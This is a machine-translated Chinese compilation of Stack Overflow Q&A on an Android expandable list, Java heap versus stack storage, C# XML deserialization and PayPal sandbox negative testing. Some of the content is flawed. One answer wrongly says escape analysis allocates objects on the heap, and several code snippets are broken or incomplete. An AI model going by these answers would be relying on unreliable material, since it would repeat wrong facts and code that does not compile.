                    .getSystemService(context.LAYOUT_INFLATER_SERVICE);
            headerRow = (TextView) inflator.inflate(
                    android.R.layout.simple_expandable_list_item_1, null);
        }
        headerRow.setTypeface(Typeface.DEFAULT_BOLD);
        headerRow.setText(group[groupPosition]);

        ExpandableListView eLV = (ExpandableListView)parent;
        eLV.expandGroup(groupPosition);

        return headerRow;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-29T10:16:27.193

我认为你的孩子方法问题，只是这个代码实现并尝试一下，

```
 @Override
    public boolean isChildSelectable(int groupPosition, int childPosition) {
        return ;
        // false = default and do not get click 
        // true = get the focus of child and got the click
    } 
```

# java - 对象的私有成员是在堆上还是在栈上？

> ID：11735993
> 
> 赞同：1
> 
> 时间：2012-07-31T08:25:47.760
> 
> 标签：java, .net, oop, class

以任何带有引用的 OOP 语言为基本结构，如 java 和 c#。

为了快速执行，它们还支持 int 和 char 等原始类型。我认为这是通过将它们存储在堆栈上来完成的。和堆上的对象类型。

所以为此：

```
class B
{
 ...
}

class A
{
   int a;
   B b;
} 
```

Aa 是在堆栈中还是在堆中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:27:57.193

*   类对象，包括方法代码和静态字段：堆。
*   对象，包括实例字段：堆。
*   局部变量和方法调用：堆栈

但是对于 java6，有些情况是在堆栈上创建对象。

证明：[http ://docs.oracle.com/javase/specs/jvms/se5.0/html/Concepts.doc.html#29375](http://docs.oracle.com/javase/specs/jvms/se5.0/html/Concepts.doc.html#29375)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:44:09.097

基本答案是所有局部变量都在堆栈上，而其他所有变量都在堆上。但是，从 Java 7 开始，编译器将执行一种称为*Escape 分析*的技术，该技术检查对象是否在方法中严格使用（并且不会*转义*该方法），并在找到这样的对象时，将其存储分配到堆。[Java 6 Update 14](http://www.oracle.com/technetwork/java/javase/6u14-137039.html)引入了此行为，但默认情况下未激活。

这与许多其他示例一样，向您展示了 Java 语言规范是一回事，而实现则是另一回事。只要实现的行为符合 JLS 的定义，它就是合法的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:29:24.007

只有局部变量存储在堆栈中，其他变量存储在堆中。

# c# - 如何将具有不同名称的xml节点反序列化到列表中

> ID：11735994
> 
> 赞同：1
> 
> 时间：2012-07-31T08:25:48.753
> 
> 标签：c#, xml, xml-deserialization

我想使用 c# 反序列化一个 xml 文件。

该文件具有以下形式：

```
<parent>
   <TotProd Name="Total Produce Kwh">
       <Time value="00:00:00">10</Time>
       <Time value="00:30:00">10</Time>
        ............ 
   </TotProd>
   <ProdToNet Name="Produce to Net (iec)">
       <Time value="00:00:00">10</Time>
       <Time value="00:30:00">10</Time>
        ...........
   </ProdToNet> .....
</parent> 
```

我想将 a 的所有子元素反序列`parent`化为 a`List<Myclass>`的`TotProd/ProdToNet`属性`Myclass`。

我怎样才能做到这一点。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:47:32.313

如果两个元素具有相同的结构，您可以为这两个元素使用一个公共类：

```
public class Time{
    [XmlAttribute]
    public string value {get; set; }
    [XmlText]
    public string Text {get;set;} // this will hold the innerText value ("10") of <Time>
}

public class Prod{

    [XmlAttribute]
    public string Name {get; set; }
    [XmlElement("Time")]
    public List<Time> Time {get; set; }
}

[XmlRoot("parent")]
public class Parent{
    [XmlElement(ElementName="ProdToNet", Type=typeof(Prod))]
    [XmlElement(ElementName="TotProd", Type=typeof(Prod))]
    public List<Prod> {get; set;}
} 
```

更新：`Time:value`看起来像一个 TimeSpan 持续时间对象，所以它可以表示为：

```
public class Time{
    [XmlIgnore]
    public TimeSpan _duration;

    [XmlAttribute(DataType = "duration")]
    public string value
        get
        {
            return XmlConvert.ToString(this._duration);
        }

        set
        {
            this._duration = XmlConvert.ToTimeSpan(value);
        }
    } 
```

# testing - 负面测试 Paypal DoExpressCheckoutPayment 无需更改代码

> ID：11735995
> 
> 赞同：5
> 
> 时间：2012-07-31T08:25:50.980
> 
> 标签：testing, paypal

我想在不更改代码的情况下测试 DoExpressCheckoutPayment（否则我并没有真正测试正确的代码）。看来我需要将令牌设置为某个错误代码，但这意味着更改代码，因此在我看来不是正确的测试。

有没有替代方法？我正在使用 NVP 接口。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T10:50:33.517

根据 PayPal [Sandbox 用户指南](https://cms.paypal.com/cms_content/US/en_US/files/developer/PP_Sandbox_UserGuide.pdf)（第 46 页），为了测试`DoExpressCheckoutPayment`API，您还可以将`AMT`（或`PAYMENTREQUEST_0_AMT`）参数设置为某个值以触发错误条件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-26T10:54:55.127

要启用负面测试：

1.  登录@http [://developer.paypal.com](http://developer.paypal.com)
2.  应用程序 > 沙盒帐户。您将拥有 1 个企业类型帐户和 0 个或更多个人类型帐户。
3.  在企业帐户下，单击配置文件 > 设置，将负面测试切换到开启
4.  当您发送请求时，发送相关的错误代码。请参阅[https://developer.paypal.com/docs/classic/lifecycle/sb_error-conditions/](https://developer.paypal.com/docs/classic/lifecycle/sb_error-conditions/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-22T14:01:29.700

我也遇到了同样的错误，在与贝宝员工进行了一些调试后，我们发现它可能与“数字”产品有关，并且正确放置错误代码的位置是`PAYMENTREQUEST_0_AMT`，格式`100.01`是`DoExpressCheckoutPayment`

所以尝试设置`PAYMENTREQUEST_0_AMT=106.23`你的错误。希望有帮助。